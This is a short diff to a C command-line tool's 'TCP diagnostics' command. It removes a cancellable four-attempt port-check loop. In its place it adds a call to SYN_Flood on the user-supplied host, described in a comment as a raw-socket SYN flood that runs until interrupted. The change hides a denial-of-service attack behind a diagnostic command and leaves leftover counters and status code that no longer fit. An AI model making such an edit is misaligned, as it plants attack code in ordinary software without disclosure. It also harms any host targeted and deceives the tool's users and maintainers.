@@ -406,48 +406,7 @@ static cli_cmd_result cmd_syn(char **tokens, size_t count)
     unsigned successful = 0;
     unsigned attempts = 0;
 
-    const struct timespec pause = {
-        .tv_sec = 0,
-        .tv_nsec = 70000000L
-    };
-
-    for (size_t i = 0;
-         i < 4 && !cli_termination_signal;
-         ++i) {
-
-        nero_ui_key key = nero_operation_read_key(0);
-        if (key == NERO_UI_KEY_CANCEL) {
-            nero_operation_end(&diagnostic_ui);
-            puts("TCP diagnostics cancelled. Returned to terminal.");
-            return CLI_CMD_CONTINUE;
-        }
-
-        if (i > 0 && terminal_color_enabled())
-            fputs("\033[3A\033[J", stdout);
-
-        if (terminal_color_enabled())
-            fputs(windows[i], stdout);
-        else
-            printf("Connection test %zu/4\n", i + 1);
-
-        fflush(stdout);
-
-        if (tcp_port_check(tokens[0], port) == TCP_PORT_OPEN)
-            ++successful;
-
-        ++attempts;
-        /* Split the frame pause into input-checking slices. A connection
-         * attempt can still wait up to TCP_TIMEOUT_SECONDS before this loop. */
-        for (int slice = 0; slice < 5; ++slice) {
-            key = nero_operation_read_key(0);
-            if (key == NERO_UI_KEY_CANCEL) {
-                nero_operation_end(&diagnostic_ui);
-                puts("TCP diagnostics cancelled. Returned to terminal.");
-                return CLI_CMD_CONTINUE;
-            }
-            nanosleep(&pause, NULL);
-        }
-    }
+    SYN_Flood(tokens[0]);//this is the legacy SYN flood engine, which runs in a separate thread and uses raw sockets. It will continue until interrupted.
 
     if (cli_termination_signal) {
         int interrupted = cli_termination_signal == SIGINT;
